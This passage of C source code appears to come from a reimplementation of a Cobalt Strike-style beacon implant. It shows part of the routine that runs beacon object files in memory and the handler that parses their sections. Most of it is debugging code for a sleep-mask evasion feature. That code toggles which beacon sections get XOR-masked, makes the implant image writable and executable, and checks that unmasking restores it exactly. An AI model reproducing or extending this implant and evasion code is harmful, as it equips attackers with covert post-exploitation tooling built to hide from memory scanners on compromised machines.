					if (GetFileAttributesA("C:\\Users\\Public\\sm_sect") != INVALID_FILE_ATTRIBUTES)
						sm_mode |= 8;
					if (GetFileAttributesA("C:\\Users\\Public\\sm_heap") != INVALID_FILE_ATTRIBUTES)
						sm_mode |= 16;
					if (GetFileAttributesA("C:\\Users\\Public\\sm_t1") != INVALID_FILE_ATTRIBUTES)
						sm_mode |= 32;
					/* sm_p1..sm_p6: keep only the first N pairs (bisect) */
					{
						int pn;
						for (pn = 1; pn <= 6; pn++) {
							char mp[32];
							wsprintfA(mp, "C:\\Users\\Public\\sm_p%d", pn);
							if (GetFileAttributesA(mp) != INVALID_FILE_ATTRIBUTES) {
								sm_mode |= (DWORD)(0x100 << pn);
								sm_keep_pairs(gparms, pn);
								break;
							}
						}
					}
					/* sm_skip5: mask everything except pair index 5.
					   sm_only5: mask pair index 5's range alone. */
					if (GetFileAttributesA("C:\\Users\\Public\\sm_skip5") != INVALID_FILE_ATTRIBUTES) {
						sm_mode |= 0x4000;
						if (gparms != NULL && gparms->sections != NULL) {
							gparms->sections[10] = 0;
							gparms->sections[11] = 0;
						}
					}
					if (GetFileAttributesA("C:\\Users\\Public\\sm_only5") != INVALID_FILE_ATTRIBUTES) {
						sm_mode |= 0x8000;
						if (gparms != NULL && gparms->sections != NULL) {
							gparms->sections[0] = gparms->sections[10];
							gparms->sections[1] = gparms->sections[11];
							gparms->sections[2] = 0;
							gparms->sections[3] = 0;
						}
					}
					sm_span = sm_max_end(gparms);
					g_sm_spanraw = sm_span;
					g_sm_img = sm_image_size(gparms ? gparms->beacon_ptr : NULL);
					/* FIX: the delivered table describes the official sleeve
					 * layout (larger than ours); clamp the walk to OUR image
					 * or it XORs 112KB past the mapping. */
					if (gparms != NULL && g_sm_img != 0 && sm_span > g_sm_img)
						sm_span = sm_clamp_sections(gparms);
					sm_dump_gparms(gparms, code_dst, total, t, sm_mode, sm_span,
						(void *)inlinefunc);
					if (gparms != NULL) {
						if ((sm_mode & 1) != 0) {
							gparms->sections = empty_sections;
							gparms->heap_records = sm_empty_heap;
						}
						else if ((sm_mode & 8) != 0)
							gparms->heap_records = sm_empty_heap;
						else if ((sm_mode & 16) != 0)
							gparms->sections = empty_sections;
					}
					if ((sm_mode & 2) != 0 && gparms != NULL && sm_span != 0) {
						DWORD sm_old;
						if (VirtualProtect(gparms->beacon_ptr, sm_span,
								PAGE_EXECUTE_READWRITE, &sm_old))
							sm_mode |= 4;
					}
					if ((sm_mode & 32) != 0)
						t = 1;
					/* snapshot the image so the POST write can prove whether
					 * the unmask walk restored it byte-for-byte */
					if (gparms != NULL && sm_span != 0) {
						g_sm_snaplen = sm_span;
						g_sm_snap = (char *)malloc(sm_span);
						if (g_sm_snap != NULL)
							memcpy(g_sm_snap, gparms->beacon_ptr, sm_span);
					}
				}
#endif
				if (gparms == NULL)
					Sleep(t);
#if defined(_M_X64)
				else
					sm_invoke_seh((void *)inlinefunc, gparms, t);
#else
				else
					((void (*)(GARGLEP *, void *, DWORD))inlinefunc)(gparms, (void *)Sleep, t);
#endif
#if defined(_M_X64)
				/* breadcrumb: proves the BOF returned (crash inside invoke
				 * never reaches this write); diffs the image against the
				 * pre-invoke snapshot to test restore fidelity */
				if (gparms != NULL) {
					HANDLE ph = CreateFileA("C:\\Users\\Public\\sm_post.txt",
						FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS,
						FILE_ATTRIBUTE_NORMAL, NULL);
					if (ph != INVALID_HANDLE_VALUE) {
						char lb[160];
						DWORD wr2;
						int ln = wsprintfA(lb, "returned t=%u\r\n", t);
						if (g_sm_snap != NULL && g_sm_snaplen != 0) {
							DWORD i3;
							DWORD firstdiff = g_sm_snaplen;
							unsigned int diffs = 0;
							for (i3 = 0; i3 < g_sm_snaplen; i3++) {
								if ((unsigned char)g_sm_snap[i3] !=
										(unsigned char)gparms->beacon_ptr[i3]) {
									if (firstdiff == g_sm_snaplen)
										firstdiff = i3;
									diffs++;
								}
							}
							ln += wsprintfA(lb + ln, "diffs=%u first=%06X\r\n",
								diffs, firstdiff);
						}
						WriteFile(ph, lb, (DWORD)ln, &wr2, NULL);
						CloseHandle(ph);
					}
					if (g_sm_snap != NULL) {
						free(g_sm_snap);
						g_sm_snap = NULL;
						g_sm_snaplen = 0;
					}
				}
#endif
				beacon_sleep_mask_set_exec(NULL, 0, 0);
			}
			else {
				inlinefunc(args, alen);
			}
		}
	}

	if (!setting_short(SETTING_BOF_REUSE_MEMORY)) {
		bof_free(base, how);
		if (bof_cached == base) {
			bof_cached = NULL;
			bof_cached_size = 0;
		}
	}
	free(ftable);
	return success;
}

void command_inline_execute_object(char * buffer, int length) {
	datap parser;
	DWORD entry;
	datap_buffer args;
	int prefix_len;

	data_init(&parser, buffer, length);
	data_int(&parser);       /* bssSize */
	data_extract(&parser);   /* code */
	data_extract(&parser);   /* rdata */
	data_extract(&parser);   /* data */
	data_extract(&parser);   /* xdata */
	data_extract(&parser);   /* pdata */
	data_extract(&parser);   /* relocs */
	prefix_len = length - parser.length;
	entry = data_int(&parser);
	args = data_extract(&parser);
	command_inline_execute_object_parsed(buffer, prefix_len, entry, args.buffer, args.length, 0);
}